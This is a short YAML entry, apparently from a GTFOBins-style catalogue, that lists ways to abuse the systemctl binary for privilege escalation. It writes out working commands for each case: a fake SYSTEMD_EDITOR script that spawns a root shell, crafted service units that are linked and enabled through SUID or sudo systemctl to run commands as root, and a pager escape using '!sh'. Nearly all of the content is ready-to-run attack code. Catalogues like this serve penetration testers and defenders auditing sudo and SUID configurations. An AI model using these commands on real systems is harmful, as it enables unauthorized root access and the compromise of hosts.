---
functions:
  shell:
    - code: |
        cat >/tmp/getshell <<EOF
        #!/usr/bin/env bash
        bash
        EOF
        chmod +x /tmp/getshell
        sudo SYSTEMD_EDITOR=/tmp/getshell systemctl edit <SERVICE>
    - description: This invokes the `SYSTEMD_EDITOR` that is specified. You could also just use `vi` and start a subshell manually.
  suid:
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
  sudo:
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        sudo systemctl link $TF
        sudo systemctl enable --now $TF
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo systemctl
        !sh
---
